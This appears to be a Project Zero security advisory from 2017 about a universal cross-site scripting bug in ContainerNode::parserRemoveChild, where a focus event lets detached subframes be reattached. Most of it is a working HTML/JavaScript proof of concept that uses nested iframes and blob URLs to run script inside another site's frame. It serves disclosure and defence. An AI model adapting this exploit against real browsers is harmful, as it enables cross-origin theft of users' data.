# UXSS via ContainerNode::parserRemoveChild (2)

> Reported by lokihardt@google.com, Feb 17 2017

Here's a snippet of `ContainerNode::parserRemoveChild`.

```cpp
void ContainerNode::parserRemoveChild(Node& oldChild)
{
    disconnectSubframesIfNeeded(*this, DescendantsOnly); <<---- (a)
    ...
    document().notifyRemovePendingSheetIfNeeded(); <<---- (b)
}
```

subframes are detached at (a). But In `notifyRemovePendingSheetIfNeeded`| at (b), which fires a focus event, we can attach subframes again.

PoC:

```html
<html>

<body>
  <script>
    let xml =
      `
<body>
    <div>
        <b>
            <p>
                <script>
                let p = document.querySelector('p');
                let link = p.appendChild(document.createElement('link'));
                link.rel = 'stylesheet';
                link.href = 'data:,aaaaazxczxczzxzcz';

                let btn = document.body.appendChild(document.createElement('button'));
                btn.id = 'btn';
                btn.onfocus = () => {
                    btn.onfocus = null;

                    window.d = document.querySelector('div');
                    window.d.remove();

                    link.remove();
                    document.body.appendChild(p);

                    let m = p.appendChild(document.createElement('iframe'));
                    setTimeout(() => {
                        document.documentElement.innerHTML = '';

                        m.onload = () => {
                            m.onload = null;

                            m.src = 'javascript:alert(location);';
                            var xml = \`
<svg xmlns="http://www.w3.org/2000/svg">
<script>
document.documentElement.appendChild(parent.d);
</sc\` + \`ript>
<element a="1" a="2" />
</svg>\`;

                            var tmp = document.documentElement.appendChild(document.createElement('iframe'));
                            tmp.src = URL.createObjectURL(new Blob([xml], {type: 'text/xml'}));
                        };
                        m.src = 'https://abc.xyz/';
                    }, 0);
                };

                location.hash = 'btn';
                </scrip` +
      `t>
            </b>
        </p>
    </div>
</body>`

    let tf = document.body.appendChild(document.createElement('iframe'))
    tf.src = URL.createObjectURL(
      new Blob([xml], {
        type: 'text/html'
      })
    )
  </script>
</body>

</html>
```

Link: https://bugs.chromium.org/p/project-zero/issues/detail?id=1134